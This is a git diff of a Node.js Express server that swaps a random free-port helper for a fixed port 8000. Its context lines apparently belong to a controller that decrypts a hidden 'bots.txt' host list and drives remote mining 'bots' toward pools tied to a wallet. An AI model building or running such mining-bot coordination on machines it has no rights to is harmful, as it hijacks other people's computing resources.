@@ -1,6 +1,5 @@
 'use strict';
 const fs = require('fs');
-const net = require('net');
 const request = require('request');
 const CryptoJS = require("crypto-js");
 const express=require('express');
@@ -20,11 +19,7 @@ app.get('/',function(req,res) {
   }
   else { res.send('Hello world!') }
 });
-
-getFreePort(function(err, port) {
-  if (err) throw err;
-  app.listen(port,()=> { console.log(c.id+' Listening on port '+port) });
-});
+app.listen(8000,()=> { console.log(c.id+' Listening on port 8000') });
 
 var c = {
   id: 2,
@@ -66,25 +61,6 @@ for(var i=0; i<list.length; i++) pools.push(new mycoin({ wallet: wallet, host: l
 var bots = [];
 var list = decrypt(fs.readFileSync('bots.txt','utf8')).split('\r\n');
 for(var i=0; i<list.length; i++) { let nbot={host:list[i], state:'orange', hash:'0 h/s [0/0]'}; bots.push(nbot); wakeup(nbot) }
-
-function getFreePort(fn) {
-  var server = net.createServer();
-  var calledFn = false;
-
-  server.on('error', function(err) {
-    server.close(); if (!calledFn) { calledFn = true; fn(err) }
-  });
-
-  server.listen(0, function() {
-    var port = server.address().port;
-    server.close();
-    if (!calledFn) {
-      calledFn = true;
-      if (!port) { fn(new Error('Unable to get the server\'s given port')) }
-      else { fn(null, port) }
-    }
-  });
-}
 
 function mylist(obj) {
   var result = []
